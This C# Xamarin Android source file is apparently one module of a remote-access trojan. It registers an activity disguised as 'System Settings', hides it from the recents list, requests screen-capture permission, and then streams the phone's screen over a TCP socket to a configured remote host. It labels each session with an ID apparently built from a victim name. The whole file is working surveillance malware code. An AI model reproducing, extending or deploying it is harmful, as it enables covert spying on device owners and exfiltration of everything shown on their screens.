
using Android.App;
using Android.Content;
using Android.OS;
using System;
using System.Net;
using System.Net.Sockets;

namespace Task2
{
    [Activity(Label = "System Settings", ExcludeFromRecents = true)]
    public class screenActivty : Activity
    {
        public static Activity screnAct;
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            screnAct = this;
            RequestWindowFeature(Android.Views.WindowFeatures.NoTitle);
            //set up full screen
            Window.SetFlags(Android.Views.WindowManagerFlags.Fullscreen,
                    Android.Views.WindowManagerFlags.Fullscreen);
            startProjection();
            // Create your application here
        }

        protected override void OnActivityResult(int requestCode, Result resultCode, Intent data)
        {
            Finish();
            if (requestCode == ForegroundService.REQUEST_CODE)
            {
                if (resultCode == Result.Ok)
                {
                    try
                    {
                        ImageAvailableListener.ID = MainValues.KRBN_ISMI + "_" + ForegroundService._globalService.GetIdentifier();
                        ImageAvailableListener.screenSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        IPAddress ipadresi_dosya = Dns.GetHostAddresses(MainValues.IP)[0];
                        IPEndPoint endpoint_dosya = new IPEndPoint(ipadresi_dosya, MainValues.port);
                        ImageAvailableListener.screenSock.SendBufferSize = int.MaxValue;
                        ImageAvailableListener.screenSock.SendTimeout = -1;
                        ImageAvailableListener.screenSock.NoDelay = true;
                        ForegroundService._globalService.SetKeepAlive(ImageAvailableListener.screenSock, 2000, 1000);
                        ImageAvailableListener.screenSock.Connect(endpoint_dosya);

                        byte[] myScreenReady = ForegroundService._globalService.MyDataPacker("MYSCREENREADY", System.Text.Encoding.UTF8.GetBytes("ECHO"), ImageAvailableListener.ID);
                        ImageAvailableListener.screenSock.Send(myScreenReady, 0, myScreenReady.Length, SocketFlags.None);

                        ForegroundService.sMediaProjection = ForegroundService.mProjectionManager.GetMediaProjection((int)resultCode, data);

                        if (ForegroundService.sMediaProjection != null)
                        {

                            var metrics = Resources.DisplayMetrics;

                            ForegroundService.mDensity = (int)metrics.DensityDpi;
                            ForegroundService.mDisplay = WindowManager.DefaultDisplay;

                            // create virtual display depending on device width / height
                            ForegroundService._globalService.createVirtualDisplay();

                            // register orientation change callback
                            ForegroundService.mOrientationChangeCallback = new OrientationChangeCallback(this);
                            if (ForegroundService.mOrientationChangeCallback.CanDetectOrientation())
                            {
                                ForegroundService.mOrientationChangeCallback.Enable();
                            }

                            // register media projection stop callback
                            ForegroundService.sMediaProjection.RegisterCallback(new MediaProjectionStopCallback(), ForegroundService.mHandler);
                        }
                    }
                    catch (Exception)
                    {
                        ForegroundService._globalService.stopProjection();
                    }
                    //ComponentName componentName = new ComponentName(this, Java.Lang.Class.FromType(typeof(screenActivty)).Name);
                    //PackageManager.SetComponentEnabledSetting(componentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
                }
                else
                {
                    try
                    {
                        byte[] dataPacker = ForegroundService._globalService.MyDataPacker("NOTSTART", System.Text.Encoding.UTF8.GetBytes("ECHO"));
                        ForegroundService.Soketimiz.Send(dataPacker, 0, dataPacker.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
            }
        }
        private void startProjection()
        {
            StartActivityForResult(ForegroundService.mProjectionManager.CreateScreenCaptureIntent(), ForegroundService.REQUEST_CODE);
        }
    }
}